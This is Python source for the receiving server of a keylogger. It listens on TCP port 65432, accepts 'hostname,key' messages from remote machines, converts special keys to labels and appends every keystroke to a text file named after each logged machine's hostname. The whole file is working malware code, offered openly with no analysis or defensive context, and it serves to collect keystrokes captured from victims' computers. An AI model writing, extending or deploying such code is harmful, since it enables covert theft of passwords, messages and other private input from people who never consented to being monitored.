# ========================================= #
# Author: Luke Hendriks

# Imports
import socket
import sys

# Set debug mode True or False, if set to True, you will get output in te command prompt
debug = False

# Variables for server binding
host = ""
port = 65432
pressed_key = ""


# Color Class to use throughout the code.
class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'


# Initialize server! If it fails exit program and send error message!
def server_init():
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if debug:
        print(color.BOLD + "Created Socket!" + color.END)

    try:
        connection.bind((host, port))
        if debug:
            print(color.BOLD + "Socket Binded to port: " + color.END + str(port))
    except socket.error as err:
        if debug:
            print(color.BOLD + "Server Could Not Be Established! Please Retry Later!" + color.END)
            print(color.BOLD + "Reason: " + color.END + "\n")
            print(err)
            print("Exiting Program")
        sys.exit()

    connection.listen(5)
    if debug:
        print("\nSocket Listening! Waiting for data!")
    server_get_data(connection)


# Get data from the client!
def server_get_data(connection):
    print("Waiting for Connection!")
    conn, addr = connection.accept()
    with connection:
        print(addr[0] + " Connected!")
        while True:
            try:
                data = conn.recv(1024)
            except:
                print("No Connection!")
                server_get_data(connection)

            if not data:
                pass
            else:
                server_write_data(data)
            conn.sendall(data)


# Write all logged keys to a file named after the hostname of the logged machine
def server_write_data(data):
    global pressed_key

    data_decoded = data.decode("utf-8")
    new_data = data_decoded.split(",")

    if new_data[1] == "Key.space":
        pressed_key = "SPACE "
        pass
    elif new_data[1] == "Key.enter":
        pressed_key = "ENTER "
        pass
    elif new_data[1] == "Key.backspace":
        pressed_key = "BACKSPACE "
        pass
    elif new_data[1] == "Key.shift":
        pressed_key = "LEFT-SHIFT "
        pass
    elif new_data[1] == "Key.ctrl_l":
        pressed_key = "LEFT-CONTROL "
        pass
    elif new_data[1] == "Key.ctrl_r":
        pressed_key = "RIGHT-CONTROL "
        pass
    elif new_data[1] == "Key.shift_r":
        pressed_key = "RIGHT-SHIFT "
        pass
    elif new_data[1] == "Key.alt_l":
        pressed_key = "LEFT-ALT "
        pass
    elif new_data[1] == "Key.alt_gr":
        pressed_key = "ALT-GR "
        pass
    elif new_data[1] == "Key.tab":
        pressed_key = "TAB "
        pass
    elif new_data[1] == "Key.caps_lock":
        pressed_key = "CAPS-LOCK "
        pass
    else:
        pressed_key = str(new_data[1] + " ")

    f = open(new_data[0] + ".txt", "a")
    key_to_write = pressed_key.replace("'", "")
    f.write(key_to_write)
    f.close()


# Start Program
server_init()
